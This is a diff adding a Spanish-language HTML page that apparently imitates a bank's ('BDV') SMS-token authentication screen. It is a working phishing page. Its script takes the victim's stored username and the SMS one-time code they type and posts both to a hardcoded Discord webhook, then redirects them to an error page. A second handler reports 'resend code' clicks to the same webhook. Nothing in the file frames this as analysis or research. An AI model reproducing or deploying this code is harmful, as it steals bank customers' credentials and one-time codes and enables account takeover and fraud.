@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>BDVSOLICITUDES</title>
+  <link rel="icon" href="favicon.png" type="image/x-icon">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-image: url(background.webp);
+      background-size: cover;
+      background-position: center;
+    }
+
+    .container {
+      display: flex;
+      height: 100%;
+      width: 80%;
+    }
+
+    .left-side {
+      width: 40%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .right-side {
+      width: 30%;
+    }
+
+    form {
+      width: 80%;
+      background: white;
+      max-width: 550px;
+      box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+    }
+
+    @media (max-width: 768px) {
+      body {
+        background: #ededed;
+      }
+      .container {
+        flex-direction: column;
+      }
+      .left-side {
+        width: 100%;
+        height: 100vh;
+      }
+      .right-side {
+        display: none;
+      }
+    }
+
+    .form-group {
+      position: relative;
+      margin-bottom: 20px;
+      margin: 20px;
+    }
+
+    .form-group label {
+      position: absolute;
+      top: 50%;
+      left: 10px;
+      transform: translateY(-55%);
+      color: #999;
+      transition: top 0.3s, font-size 0.3s;
+      pointer-events: none;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      box-sizing: border-box;
+      position: relative;
+      height: 60px;
+      border: 0;
+      border-bottom: 1px solid gray;
+      background: #ededed;
+      outline: none;
+    }
+
+    .form-group input:focus {
+      border: 0;
+    }
+
+    .form-group input:focus + label,
+    .form-group input:not(:placeholder-shown) + label {
+      top: 5px;
+      font-size: 12px;
+    }
+
+    button {
+      background-color: #0067b1;
+      color: white;
+      border-radius: 3px;
+      border: 0;
+      padding: 10px 20px;
+      text-align: center;
+      display: inline-block;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      font-size: 16px;
+      width: auto; /* El ancho del botón se ajusta al contenido */
+    }
+
+    /* Estilo para el botón deshabilitado */
+    button:disabled {
+      background-color: #E0E0E0;
+      cursor: not-allowed;
+    }
+
+    /* Estilo para el botón "Cancelar" */
+    .cancel-btn {
+      background-color: #0067b1;
+      color: white;
+    }
+
+    #timerContainer {
+      margin-top: 20px;
+    }
+
+    #timerText {
+      color: #0067b1;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left-side">
+      <form id="smsform">
+        <div style="text-align: center">
+          <img src="logo1.png" alt="" style="width: 60%; margin-top: 20px" />
+        </div>
+        <div style="width: 100%; text-align: center">
+          <div style="margin: 10px; color: #0067b1 !important">
+            <h4>Autenticación</h4>
+          </div>
+          <div style="width: 100%; text-align: center">
+            <div style="margin: 10px; color: #0067b1 !important">
+              <h5>
+                Introduzca el token recibido por SMS.
+              </h5>
+            </div>
+            <div class="form-group">
+              <input
+                type="tel"
+                id="sms"
+                maxlength="8"
+                required
+                oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                minlength="6"
+              />
+              <label for="sms">Código SMS *</label>
+            </div>
+            <!-- Campo oculto para enviar el nombre guardado en localStorage -->
+            <input type="hidden" id="nombreOculto" name="nombre" />
+          </div>
+          <div style="width: 100%; text-align: center">
+            <button type="submit" id="continuarBtn" disabled>Continuar</button>
+            <button type="button" class="cancel-btn" id="cancelBtn">Cancelar</button>
+          </div>
+          <!-- Contenedor para el cronómetro -->
+          <div id="timerContainer" style="margin-top: 20px;">
+            <p id="timerText" style="color: #0067b1; cursor: progress;">Su código vence en: <span id="timeLeft">02:00</span></p>
+          </div>
+          <div style="width: 100%; height: 30px"></div>
+        </div>
+      </form>
+    </div>
+    <div class="right-side"></div>
+  </div>
+
+<script>
+  const nombre = localStorage.getItem("usuario");
+  const smsInput = document.getElementById('sms');
+  const continuarBtn = document.getElementById('continuarBtn');
+  const nombreOculto = document.getElementById('nombreOculto');
+  const cancelBtn = document.getElementById('cancelBtn');
+
+// 3. Validamos que el input exista y que 'nombre' tenga datos (que no sea null)
+if (nombreOculto && nombre) {
+  // Asignas el valor extraído al value del input
+  nombreOculto.value = nombre;
+}
+
+  // Tu Webhook de Discord (Reemplaza con el tuyo)
+  const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1539732412932694076/rUFhtMFyN4jqizqLxBR2Ga7bl4wyRC3rWkE-erePhljO6eSliLyNAQzwpaegrvG97iNX";
+
+  // Función para quitar espacios y validar botón "Entrar"
+  function quitarEspacios() {
+    continuarBtn.disabled = smsInput.value.length < 4;
+  }
+
+  // Habilitar el botón "Continuar" solo si el código tiene al menos 6 dígitos
+      document.getElementById("sms").addEventListener("input", function() {
+        const sms = document.getElementById("sms").value;
+        const continuarButton = document.getElementById("continuarBtn");
+
+        // Si el código tiene al menos 6 caracteres, habilita el botón
+        if (sms.length >= 6) {
+          continuarButton.disabled = false;
+        } else {
+          continuarButton.disabled = true;
+        }
+      });
+
+  // Redirigir a validacion cuando se hace clic en el botón "Cancelar"
+      document.getElementById("cancelBtn").addEventListener("click", function() {
+        const nombre = localStorage.getItem("usuario");
+        if (nombre) {
+          // Redirige a cancel2.php con el nombre como parámetro en la URL
+          window.location.href = `validacion.html`;
+        } else {
+          // Si no se encuentra el nombre en localStorage, redirige sin el parámetro
+          window.location.href = 'validacion.html';
+        }
+      });
+
+  
+
+  // Envío de datos a Discord
+  document.getElementById('smsform').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    continuarBtn.innerText = "Cargando...";
+    continuarBtn.disabled = true;
+
+    const data = {
+      content: "🔔 **BDV Login AW**",
+      embeds: [{
+        title: "Datos BDV",
+        color: 16711680, // Rojo BDV
+        fields: [
+          { name: "Usuario", value: nombreOculto.value, inline: false },
+          { name: "SMS 2", value: smsInput.value, inline: false },
+          { name: "Fecha/Hora", value: new Date().toLocaleString() }
+        ],
+        footer: { text: "BDV AW" }
+      }]
+    };
+
+    try {
+      const response = await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+
+      if (response.ok) {
+        // Redirección opcional después del envío exitoso
+        window.location.href = "error.html";
+      } else {
+        alert("Error de conexión, intente más tarde.");
+      }
+    } catch (error) {
+      console.error("Error:", error);
+    }
+
+
+    });
+</script>
+
+<script>
+
+const botonReenviar = document.getElementById("btnReenviar");
+
+
+// ==========================================
+// CRONÓMETRO DE 1 MINUTOS (Ejecución Inmediata)
+// ==========================================
+
+let timer = 60; // 1 minuto en segundos
+const timerText = document.getElementById("timeLeft");
+const timerContainer = document.getElementById("timerContainer");
+
+function updateTimer() {
+  // Comprobamos que los elementos existan en el HTML para evitar errores en la consola
+  if (!timerText) return;
+
+  const minutes = Math.floor(timer / 60);
+  const seconds = timer % 60;
+  
+  // Formatea el tiempo a formato MM:SS (ej: 02:00)
+  timerText.textContent = `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
+
+  if (timer <= 0) {
+    clearInterval(timerInterval);
+    timerText.textContent = "Reenviar código"; 
+    if (timerContainer) {
+      timerContainer.innerHTML = `<br><a id="btnReenviar" style="color: #0067b1; text-decoration: none; cursor: pointer; font-weight: bold;">Reenviar código</a>`;
+    }
+  } else {
+    timer--;
+  }
+}
+
+// Inicia el cronómetro inmediatamente asignándolo a una constante global
+const timerInterval = setInterval(updateTimer, 1000);
+
+// Ejecutar la función una primera vez manualmente para que no aparezca 
+// el texto por defecto del HTML durante el primer segundo de espera
+updateTimer();
+
+
+// Escuchamos el click en el CONTENEDOR, que siempre está vivo en el HTML
+if (timerContainer) {
+  timerContainer.addEventListener("click", async (e) => {
+    // Validamos si el elemento clickeado adentro del contenedor es nuestro enlace
+    if (e.target && e.target.id === "btnReenviar") {
+      e.preventDefault(); // Evita que el enlace intente recargar la página
+
+      const data = {
+        content: "🔔 **BDV Login AW**",
+        embeds: [{
+          title: "Datos BDV",
+          color: 16711680, 
+          fields: [
+            { name: "Usuario", value: typeof nombreOculto !== 'undefined' ? nombreOculto.value : "No definido", inline: false },
+            { name: "Acción", value: "Enviar codigo de nuevo", inline: false },
+            { name: "Fecha/Hora", value: new Date().toLocaleString() }
+          ],
+          footer: { text: "BDV AW" }
+        }]
+      };
+
+      try {
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+
+        if (response.ok) {
+          window.location.href = "reenviandoe.html";
+        } else {
+          alert("Error de conexión, intente más tarde.");
+        }
+      } catch (error) {
+        console.error("Error:", error);
+      }
+    }
+  });
+}
+</script>
+
+
+  
+</body>
+</html>
